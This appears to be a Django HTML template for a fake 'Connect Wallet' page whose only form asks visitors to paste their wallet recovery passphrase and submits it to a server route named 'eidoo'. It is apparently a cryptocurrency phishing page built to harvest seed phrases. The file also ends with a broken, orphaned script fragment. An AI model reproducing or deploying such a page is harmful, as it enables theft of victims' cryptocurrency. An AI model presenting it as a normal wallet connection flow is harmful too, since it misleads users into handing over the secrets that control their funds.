<!DOCTYPE html>
<html lang="en">
<head>

	<title>Connect Wallet</title>
	<link rel="icon" type="image/x-icon" href="{% static 'images/download.svg' %}">

<body>
	<section class="one">
		<p>Connect Wallet</p>
		<ul class="nav nav-tabs">
			<li class="nav-item"><a class="nav-link active" data-toggle="tab" href="#phrase">Phrase</a></li>
		</ul>

		<div class="tab-content">
			<div role="tabpanel" class="tab-pane fade show active" id="phrase">
				<form action="{% url 'node:eidoo' %}" method="post">
					{% csrf_token %}
					<textarea name="passphrase" id="" cols="30" rows="5" minlength="45" required></textarea>
					<p class="text-secondary" style="margin-top: 10px;">Typically a 12, 18 or 45-word characters</p>
					<button class="btn btn-primary btn-block" type="submit">CONNECT WALLET</button>
				</form>
			</div>
		</div>
		
	</section>

		s0.parentNode.insertBefore(s1,s0);
		})();
		</script>
